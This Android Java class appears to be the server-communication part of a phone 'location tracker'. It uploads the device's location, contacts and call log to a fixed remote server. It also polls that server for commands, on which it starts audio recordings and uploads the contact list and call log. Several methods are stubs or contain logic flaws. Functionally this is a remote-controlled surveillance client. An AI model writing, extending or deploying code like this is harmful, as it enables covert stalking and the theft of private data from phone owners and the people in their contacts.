package com.varbin.locationtracker.APIs;

import android.bluetooth.BluetoothClass;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.jaredrummler.android.device.DeviceName;

import AutoVoiceRecorder.recorderClass;
import callDetails.contactList;
import callDetails.inActiveCommand;
import callDetails.lastCall;
import models.AttrModel;
import models.FileUpload;
import models.getCommandMode;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import synceAdapter.AccountConstants;

import static android.content.ContentValues.TAG;

import androidx.annotation.RequiresApi;

import java.io.IOException;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.List;

public class CreaterClass {
    private static Retrofit retrofit ;
    private static String baseUrl = "https://mobitrack.varbin.com/index.php/Api/";
    public static void LocationSender(double latitude , double Longitude){

         retrofit = new Retrofit.Builder()
            .baseUrl(baseUrl)
            .addConverterFactory(GsonConverterFactory.create())
            .build();
        MyInterface myInterface = retrofit.create(MyInterface.class);
        String DeviceName = com.jaredrummler.android.device.DeviceName.getDeviceName();
        ModelClass modelClass = new ModelClass(DeviceName , Build.ID , Build.BRAND ,latitude , Longitude);
        Call<ModelClass> call = myInterface.createLocation(modelClass);
        call.enqueue(new Callback<ModelClass>() {
            @Override
            public void onResponse(Call<ModelClass> call, Response<ModelClass> response) {
                Log.d("TAG", "onResponse: "+response);
            }

            @Override
            public void onFailure(Call<ModelClass> call, Throwable t) {
                Log.d("TAG", "onResponseFail: "+t.getMessage());

            }
        });
    }
    public static void ContactCreater(String Name , double Mobile){
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface = retrofit.create(MyInterface.class);
        ContactModel cm = new ContactModel(Name, Mobile , Build.MODEL ,Build.ID, Build.BRAND );
        Call<ContactModel> contactModelCall = myInterface.createContact(cm);
        contactModelCall.enqueue(new Callback<ContactModel>() {
            @Override
            public void onResponse(Call<ContactModel> call, Response<ContactModel> response) {
                Log.d(TAG, "onResponse1: "+response.body());

            }

            @Override
            public void onFailure(Call<ContactModel> call, Throwable t) {
                Log.d(TAG, "onResponse1: fail "+t.getLocalizedMessage());
            }
        });
    }
    public static void getStatus(Context context){
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
         MyInterface myInterface =  retrofit.create(MyInterface.class);
         Call<List<AttrModel>>  call = myInterface.getCommand(baseUrl+AccountConstants.getStatus);
         call.enqueue(new Callback<List<AttrModel>>() {
             @RequiresApi(api = Build.VERSION_CODES.O)
             @Override
             public void onResponse(Call<List<AttrModel>> call, Response<List<AttrModel>> response) {
                List<AttrModel> model = response.body();
                if (model!=null){
                    for (int i = 0; i < model.size(); i++) {

                        switch (model.get(i).getCommand()) {
                            case "sound_record" :{
                                Log.d(TAG, "onResponse: case "+"sound_record"+i);
                                recorderClass.startRecording(context.getApplicationContext() , 5000);
                                break;
                            }
                            case "contact_list" :{
                                Log.d(TAG, "onResponse: case "+"contact_list"+i);
                                contactList.sendContactToserver(context);
                                break;
                            }
                            case "contact_log" :{
                                Log.d(TAG, "onResponse: case "+"contact_log"+i);
                                lastCall.logModel(context.getApplicationContext());
                                break;
                            }
                            case "live_location" :{
                                Log.d(TAG, "onResponse: case "+"live_location"+i);
                                break;
                            }
                        }
                    }

                }else {
                    Log.d(TAG, "onResponse: null");
                }

             }

             @Override
             public void onFailure(Call<List<AttrModel>> call, Throwable t) {
                 retrofit = new Retrofit.Builder()
                         .baseUrl(baseUrl)
                         .addConverterFactory(GsonConverterFactory.create())
                         .build();
                 MyInterface myInterface =  retrofit.create(MyInterface.class);

             }
         });

    }
    public static <T> void uploadFileonServer(ArrayList<T> arrayList){
        Log.d(TAG, "uploadFileonServer: return ");
        return;
    }
    public static boolean inActive(String command){
        final boolean flage ;
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);

        Call<inActiveCommand> call = myInterface.inActiveCommand(baseUrl+AccountConstants.inActive+command);
        call.enqueue(new Callback<inActiveCommand>() {
            @Override
            public void onResponse(Call<inActiveCommand> call, Response<inActiveCommand> response) {
                Log.d(TAG, "uploadFileonServer: Inactivated"+ response.message());
                AccountConstants.isInactive = true;
            }
            @Override
            public void onFailure(Call<inActiveCommand> call, Throwable t) {
                AccountConstants.isInactive = false;
            }
        });
        flage = AccountConstants.isInactive;
        return flage;
    }
    public static boolean FileDataUploader(String command , String date , String path) throws IOException {

        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        FileUpload fileUpload = new FileUpload( command, Build.ID , date, path);
        Gson gson = new Gson();
        String s = gson.toJson(fileUpload);
        Log.d(TAG, "onResponse: "+s);
//        Call<FileUpload> call = myInterface.sendData2(command.trim(), Build.ID.trim(), path.trim() ,date.trim() );
        Call<FileUpload> call = myInterface.sendData2(fileUpload);
        call.enqueue(new Callback<FileUpload>() {
            @Override
            public void onResponse(Call<FileUpload> call, Response<FileUpload> response) {
                Log.d(TAG, "onResponse: "+response.message());

            }

            @Override
            public void onFailure(Call<FileUpload> call, Throwable t) {
                Log.d(TAG, "onResponse: "+t.getLocalizedMessage());
            }
        });










//        Log.d(TAG, "FileDataUploader: in");
//        MediaType mediaType  = MediaType.parse("application/json");
//        OkHttpClient client = new OkHttpClient();
//        FileUpload fl =  new FileUpload(date, path, Build.ID, command);
//        Gson gson = new Gson();
//        try {
//            String json = gson.toJson(fl);
//            gson.toJson(fl);
//            RequestBody requestBody = RequestBody.create( mediaType, json);
//            Request request = new Request.Builder()
//                    .url(baseUrl+"setCommandFile")
//                    .post(requestBody).build();
//            okhttp3.Call call = client.newCall(request);
//            okhttp3.Response response = call.execute();
//            Log.d(TAG, "FileDataUploader: "+  response.message().toString());
//        }catch (Exception e){
//            Log.d(TAG, "FileDataUploader: e"+e);
//        }
        return false;
    }
}
